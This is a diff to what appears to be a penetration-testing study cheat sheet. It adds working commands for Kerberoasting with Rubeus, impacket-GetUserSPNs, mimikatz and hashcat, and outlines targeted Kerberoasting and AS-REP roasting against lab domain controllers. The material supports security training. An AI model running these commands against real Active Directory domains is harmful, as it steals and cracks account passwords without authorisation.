@@ -719,9 +719,27 @@ hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
 ```
 
 ### Manual [Kerberoasting] effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script (Kerberoasting)
-
+- method 1
 ```bash
-#get SPN
+#automatically find kerberoastable users  in targeted Domain
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+#crack hash using hashcat 13100, TGS-REP, output is plaintext password of kerberoastable account
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+- method 2 in Kali
+```bash
+#ip of DC (-dc-ip), credential of domain user (corp.com/pete), obtain TGS (-request)
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+
+#crack hash using hashcat 13100
+sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+- method 2 in Windows
+```bash
+#get SPN that you want to target
 impacket-GetUserSPNs exam.com/apachesvc -dc-ip 172.16.1xx.100
 
 #requesting TGS ticket, i.e. .kirbi
@@ -735,6 +753,13 @@ mimikatz # kerberos :: list /export
 #crack hash using kirbi2john.py
 python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
 ```
+
+### Targeted Kerberoasting
+- Condition: have GenericWrite or GenericAll permissions on another AD user account
+- then, purposely set SPN for the targeted user
+- then kerberoast the account
+- then crack the hash using hashcat to get the clear password
+- after attack, REMEMBER to delete the SPN
 
 ### AS-REP roasting
 - Find user account with user account option "Do not require Kerberos preauthentication" ENABLED, then obtain their password thru AS-REP hashes
